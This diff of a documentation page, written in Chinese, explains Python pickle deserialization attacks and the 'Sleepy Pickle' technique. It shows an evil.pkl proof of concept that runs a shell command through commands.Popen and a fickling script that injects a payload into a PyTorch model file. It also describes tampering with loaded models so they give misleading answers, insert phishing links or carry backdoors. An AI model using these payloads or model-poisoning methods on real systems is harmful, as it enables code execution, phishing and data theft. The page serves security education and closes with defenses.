@@ -1421,25 +1421,16 @@
         <li class="md-nav__item">
   <a href="#sleepy-pickle" class="md-nav__link">
     <span class="md-ellipsis">
-      Sleepy Pickle
+      💤Sleepy Pickle
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#demo" class="md-nav__link">
+  <a href="#_1" class="md-nav__link">
     <span class="md-ellipsis">
-      Demo
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#strict-pickle" class="md-nav__link">
-    <span class="md-ellipsis">
-      Strict Pickle
+      🦾如何防範
     </span>
   </a>
   
@@ -1448,7 +1439,7 @@
         <li class="md-nav__item">
   <a href="#reference" class="md-nav__link">
     <span class="md-ellipsis">
-      Reference
+      📚Reference
     </span>
   </a>
   
@@ -1480,7 +1471,7 @@
 <h2 id="what-is-pickle">🥒 What is Pickle?</h2>
 <p>Pickle 是 Python 的內建模組，提供了將 Python 物件序列化和反序列化的功能。</p>
 <dl>
-<dt>🔹 常見用途</dt>
+<dt>常見用途</dt>
 <dd>
 <p>將物件儲存到檔案中，方便之後載入。</p>
 </dd>
@@ -1490,7 +1481,7 @@
 <dd>
 <p><strong>快速儲存和載入機器學習模型、配置檔或計算結果</strong>。</p>
 </dd>
-<dt>🔸 支援的物件類型</dt>
+<dt>支援的物件類型</dt>
 <dd>
 <p>Pickle 支援多種 Python 內建的資料型態，包括：</p>
 </dd>
@@ -1507,7 +1498,7 @@
 <p>✔️ 自訂類別物件</p>
 </dd>
 <dd>
-<p>✔️ 函數（有些限制）</p>
+<p>✔️ 函數</p>
 </dd>
 </dl>
 <p>Example : </p>
@@ -1522,13 +1513,12 @@
 </span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Data has been successfully serialized to data.pkl&quot;</span><span class="p">)</span>
 </span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
 </span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;data.pkl&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    <span class="c1">#loaded_data = pickle.load(file)</span>
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>    <span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">file</span><span class="p">,)</span>
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>    <span class="c1">#print(&quot;Data loaded from data.pkl:&quot;, loaded_data)</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    <span class="n">unpickled_data</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">unpickled_data</span><span class="p">)</span>
 </span></code></pre></div>
 <p>Output: </p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Data has been successfully serialized to data.pkl
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Data loaded from data.pkl: {&#39;name&#39;: &#39;Alice&#39;, &#39;age&#39;: 30, &#39;scores&#39;: [88, 92, 95]}
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>{&#39;name&#39;: &#39;Alice&#39;, &#39;age&#39;: 30, &#39;scores&#39;: [88, 92, 95]}
 </span></code></pre></div>
 <p>可以使用pickletools將pickle執行的內容dump出來</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>    0: (    MARK
@@ -1759,6 +1749,7 @@
 </span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;evil.pkl&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
 </span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>    <span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
 </span></code></pre></div>
+<p>用pickletool 把惡意pickle檔dump出來看看</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>    0: c    GLOBAL     &#39;commands Popen&#39;
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>   16: p    PUT        0
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>   19: (    MARK
@@ -1777,16 +1768,94 @@
 <p>執行結果：
 <img alt="alt text" src="../SleepyPicklePic/reduce_RCE.png" /></p>
 <p>即可執行<code>ls</code>指令</p>
-<h2 id="sleepy-pickle">Sleepy Pickle</h2>
-<h2 id="demo">Demo</h2>
-<h2 id="strict-pickle">Strict Pickle</h2>
-<h2 id="reference">Reference</h2>
+<hr />
+<h2 id="sleepy-pickle">💤Sleepy Pickle</h2>
+<p>利用pickle不安全的特性，將惡意的Bytecode植入使用pickle的模型檔案內。</p>
+<p><img alt="alt text" src="../SleepyPicklePic/image-2.png" />
+有一個針對此攻擊而產生的工具：<a href="https://github.com/trailofbits/fickling">fickling</a></p>
+<p>此工具可以輕易的將想要執行的程式轉成bytecode值入進pickle中，另外也有檢測pickele內的惡意行為功能</p>
+<p>demo:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">torch</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">torchvision.models</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">models</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">warnings</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">fickling.pytorch</span><span class="w"> </span><span class="kn">import</span> <span class="n">PyTorchModelWrapper</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="n">warnings</span><span class="o">.</span><span class="n">filterwarnings</span><span class="p">(</span><span class="s2">&quot;ignore&quot;</span><span class="p">)</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="n">model</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">mobilenet_v2</span><span class="p">()</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="n">torch</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="s2">&quot;mobilenet.pth&quot;</span><span class="p">)</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="n">result</span> <span class="o">=</span> <span class="n">PyTorchModelWrapper</span><span class="p">(</span><span class="s2">&quot;mobilenet.pth&quot;</span><span class="p">)</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="n">temp_filename</span> <span class="o">=</span> <span class="s2">&quot;temp_filename.pt&quot;</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="n">result</span><span class="o">.</span><span class="n">inject_payload</span><span class="p">(</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>    <span class="s2">&quot;print(&#39;Inject successful!&#39;)&quot;</span><span class="p">,</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>    <span class="n">temp_filename</span><span class="p">,</span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>    <span class="n">injection</span><span class="o">=</span><span class="s2">&quot;insertion&quot;</span><span class="p">,</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>    <span class="n">overwrite</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="p">)</span>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="c1"># Load file with injected payload</span>
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="n">torch</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s2">&quot;mobilenet.pth&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<p>輸出：</p>
+<p><img alt="alt text" src="../SleepyPicklePic/image-1.png" /></p>
+<p>在 Hugging face 上在目前常出現的是<code>pytorch_model.bin</code>
+<img alt="alt text" src="../SleepyPicklePic/image-3.png" /></p>
+<p>pytorch_model.bin是使用PyTorch中的torch.save 函數所生成的二進位檔案，裡面會存 weights, biases, 或者其他parameters，如果將它unzip會有一個data.pkl可以利用(會依照Pytorch不同的版本裡面會包含不同的檔案)</p>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<ul>
+<li>PyTorch v0.1.1: Tar file with sys_info, pickle, storages, and tensors</li>
+<li>PyTorch v0.1.10: Stacked pickle files</li>
+<li>TorchScript v1.0: ZIP file with model.json</li>
+<li>TorchScript v1.1: ZIP file with model.json and attributes.pkl</li>
+<li>TorchScript v1.3: ZIP file with data.pkl and constants.pkl</li>
+<li>TorchScript v1.4: ZIP file with data.pkl, constants.pkl, and version set at 2 or higher (2 pickle files and a folder)</li>
+<li>PyTorch v1.3: ZIP file containing data.pkl (1 pickle file)</li>
+<li>PyTorch model archive format[ZIP]: ZIP file that includes Python code files and pickle files</li>
+</ul>
+</div>
+<p><img alt="alt text" src="../SleepyPicklePic/image-4.png" /></p>
+<div class="admonition warning">
+<p class="admonition-title">PyTorch適用版本</p>
+<p>PyTorch &lt;2.6 在最新 2.6版本中，Pytorch 將 torch.load 的參數weights_only預設為True</p>
+<blockquote>
+<p>Also in this release as an important security improvement measure we have changed the default value for weights_only parameter of torch.load. This is a backward compatibility-breaking change, please see this forum post for more details.</p>
+</blockquote>
+</div>
+<p>接下來Hacker 會先透過中間人攻擊、供應鏈攻擊、社交工程等手法，將惡意Pickle檔案傳送至受害者的系統，一旦反序列化後有可能會進行以下的惡意攻擊</p>
+<ul>
+<li>修改模型參數</li>
+</ul>
+<p>可以去微調模型的參數讓他輸出出誤導性或有惡意的輸出</p>
+<p>如：<a href="https://rome.baulab.info/">ROME</a></p>
+<p><img alt="alt text" src="../SleepyPicklePic/image6.png" /></p>
+<ul>
+<li>釣魚</li>
+</ul>
+<p>可以在每次問答時插入惡意的連結
+<img alt="alt text" src="../SleepyPicklePic/image-5.png" /></p>
+<ul>
+<li>埋後門</li>
+<li>XSS</li>
+<li>竊取使用者資料</li>
+<li>竄改資料</li>
+<li>...</li>
+</ul>
+<hr />
+<h2 id="_1">🦾如何防範</h2>
+<ul>
+<li>不要使用Pickle，使用 SafeTensors.</li>
+<li>如果一定要使用Pickle，需要使用fickling對pickle進行掃描或者限制unpickler</li>
+</ul>
+<hr />
+<h2 id="reference">📚Reference</h2>
 <ul>
 <li>
 <p><a href="https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/">Exploiting ML models with pickle file attacks: Part 1</a></p>
 </li>
 <li>
-<p><a href="https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/">Exploiting ML models with pickle file attacks: Part 2</a></p>
+<p><a href="https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-2/">Exploiting ML models with pickle file attacks: Part 2</a></p>
 </li>
 <li>
 <p><a href="https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/">Never a dill moment: Exploiting machine learning pickle files</a></p>
